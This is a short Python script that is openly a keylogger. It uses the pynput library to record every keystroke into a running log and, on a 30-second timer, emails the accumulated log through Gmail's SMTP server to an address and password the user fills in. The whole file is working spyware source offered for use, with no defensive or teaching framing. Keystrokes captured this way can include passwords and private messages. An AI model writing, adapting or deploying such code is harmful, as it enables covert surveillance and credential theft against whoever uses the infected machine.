

try:
    import pynput.keyboard
    import smtplib
    import threading
    import optparse

    log = ""


    def callback_function(key):
        global log
        try:
            # log = log + key.char.encode('utf-8')
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + str(key)
        except:
            pass

        print(log)







    def send_email(email, passwd, message):
        email_server = smtplib.SMTP("smtp.gmail.com", 587)
        email_server.starttls()
        email_server.login(email, passwd)
        email_server.sendmail(email, email, message)
        email_server.quit()







    # thread - threading

    def thread_func():
        global log
        send_email("enter your mail(must be gmail)","enter your password", log.encode('utf-8'))
        log = ""
        timer_object = threading.Timer(30, thread_func)
        timer_object.start()


    keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
    with keylogger_listener:
        thread_func()
        keylogger_listener.join()
except KeyboardInterrupt:
    print('exited succesfully')



